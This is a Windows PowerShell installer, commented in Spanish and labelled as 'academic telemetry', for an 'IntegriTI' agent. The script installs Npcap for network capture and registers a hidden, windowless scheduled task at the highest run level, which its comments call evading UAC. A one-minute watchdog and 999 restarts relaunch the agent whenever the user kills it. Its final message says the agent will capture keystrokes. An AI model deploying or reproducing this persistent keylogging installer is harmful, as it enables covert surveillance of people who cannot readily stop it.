# ==================================================
#  Instalador de Telemetría Académica (Windows)
# ==================================================

# 1. Comprobar si se está ejecutando como Administrador (Equivalente a sudo)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Error: Este script requiere privilegios elevados." -ForegroundColor Red
    Write-Host "[*] Haz clic derecho en PowerShell y selecciona 'Ejecutar como administrador'." -ForegroundColor Yellow
    Exit
}

$UsuarioReal = $env:USERNAME
$DirActual = (Get-Item $PSScriptRoot).Parent.FullName
# OBLIGAMOS A LA TERMINAL A MOVERSE A LA CARPETA DEL PROYECTO
Set-Location -Path $DirActual
$DirGlobal = "$env:USERPROFILE\.telemetria_global"
Start-Transcript -Path "$DirActual\install_log.txt" -Force
# 2. Crear directorio seguro
Write-Host "[*] Creando directorio seguro en: $DirGlobal" -ForegroundColor Cyan
if (-not (Test-Path $DirGlobal)) {
    New-Item -ItemType Directory -Force -Path $DirGlobal | Out-Null
}

# 3. Inyectar PYTHONPATH a nivel de usuario (Equivalente al .bashrc)
Write-Host "[*] Inyectando variable de entorno PYTHONPATH..." -ForegroundColor Cyan
$CurrentPythonPath = [Environment]::GetEnvironmentVariable("PYTHONPATH", "User")
if ($CurrentPythonPath -notmatch [regex]::Escape($DirGlobal)) {
    $NewPythonPath = if ($CurrentPythonPath) { "$DirGlobal;$CurrentPythonPath" } else { $DirGlobal }
    [Environment]::SetEnvironmentVariable("PYTHONPATH", $NewPythonPath, "User")
    Write-Host "[OK] Puente inyectado automáticamente." -ForegroundColor Green
} else {
    Write-Host "[INFO] El puente ya estaba configurado." -ForegroundColor Yellow
}
# ==========================================
# 3.5 Asegurar dependencias de red (Npcap)
# ==========================================
Write-Host "[*] Verificando motor de captura de red (Npcap)..." -ForegroundColor Cyan
$NpcapPath = "C:\Windows\System32\Npcap"

if (-not (Test-Path $NpcapPath)) {
    Write-Host "[!] Npcap no detectado. Descargando instalador oficial..." -ForegroundColor Yellow
    $NpcapUrl = "https://npcap.com/dist/npcap-1.79.exe"
    $InstallerPath = "$DirActual\npcap_installer.exe"

    # Descargar el instalador
    Invoke-WebRequest -Uri $NpcapUrl -OutFile $InstallerPath

    Write-Host "[!] ATENCION: Se abrira el instalador de Npcap. Por favor completa la instalacion manual." -ForegroundColor Yellow
    Write-Host "[!] Asegurate de marcar la opcion 'Install Npcap in WinPcap API-compatible Mode'." -ForegroundColor Yellow

    # Lanzar instalador y esperar a que el usuario termine
    Start-Process -FilePath $InstallerPath -Wait

    # Limpiar el ejecutable descargado
    Remove-Item -Path $InstallerPath -Force -ErrorAction SilentlyContinue
    Write-Host "[OK] Motor de red instalado." -ForegroundColor Green
} else {
    Write-Host "[OK] Npcap ya se encuentra instalado en el sistema." -ForegroundColor Green
}
# 4. Crear entorno virtual e instalar dependencias
Write-Host "[*] Creando entorno virtual aislado (venv)..." -ForegroundColor Cyan
# Usar el lanzador py para asegurar la version mas reciente (o forzar 3.14)
py -3.14 -m venv venv

if (Test-Path "requirements.txt") {
    Write-Host "[*] Instalando dependencias desde requirements.txt..." -ForegroundColor Cyan
    & "$DirActual\venv\Scripts\python.exe" -m pip install --upgrade pip
    & "$DirActual\venv\Scripts\pip.exe" install -r requirements.txt
    Write-Host "[OK] Dependencias instaladas." -ForegroundColor Green
}

# 5. Configurar persistencia (Equivalente a Systemd + Sudoers)
Write-Host "[*] Configurando persistencia (Programador de Tareas)..." -ForegroundColor Cyan

$TaskName = "Agente_IntegriTI_$UsuarioReal"
$ScriptPython = "$DirActual\Client\client.py"
# Usamos pythonw.exe para que no se abra ninguna ventana negra (silencioso)
$PythonVenv = "$DirActual\venv\Scripts\pythonw.exe"

# A) Definir la acción (Ejecutar el agente)
$Action = New-ScheduledTaskAction -Execute $PythonVenv -Argument "`"$ScriptPython`"" -WorkingDirectory "$DirActual\Client"

# B) Definir los gatillos:
#    B1) Al iniciar sesión este usuario (arranque normal)
$TriggerLogon = New-ScheduledTaskTrigger -AtLogOn -User $UsuarioReal

#    B2) Watchdog: reintenta cada 1 minuto, indefinidamente. Si el proceso ya
#        está corriendo, MultipleInstances=IgnoreNew hace que este disparo no
#        haga nada; si el proceso fue matado (ej. Task Manager), lo relanza
#        en el siguiente minuto sin intervención humana.
$TriggerWatchdog = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 1) `
    -RepetitionDuration (New-TimeSpan -Days 3650)

# C) Definir los privilegios (RunLevel Highest = Evade UAC, no pide permisos y da acceso a root/admin)
$Principal = New-ScheduledTaskPrincipal -UserId $UsuarioReal -LogonType Interactive -RunLevel Highest

# D) Definir las configuraciones (Oculto, no detenerse si usa batería, reiniciar si falla,
#    y NO permitir una segunda instancia en paralelo cuando el watchdog dispara mientras
#    el agente ya está vivo)
$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)

# Eliminar tarea anterior si existe
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Registrar la nueva tarea con AMBOS triggers (arranque + watchdog)
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($TriggerLogon, $TriggerWatchdog) `
    -Principal $Principal -Settings $Settings -Force | Out-Null

# Iniciar la tarea inmediatamente
Start-ScheduledTask -TaskName $TaskName
Stop-Transcript
Write-Host "[OK] Instalacion completada. Agente corriendo en segundo plano." -ForegroundColor Green
Write-Host "=================================================="
Write-Host " INSTALACION COMPLETADA CON EXITO."
Write-Host " El agente evadira el UAC, capturara teclas en Windows,"
Write-Host " y se reiniciara solo si el proceso es terminado manualmente."
Write-Host "=================================================="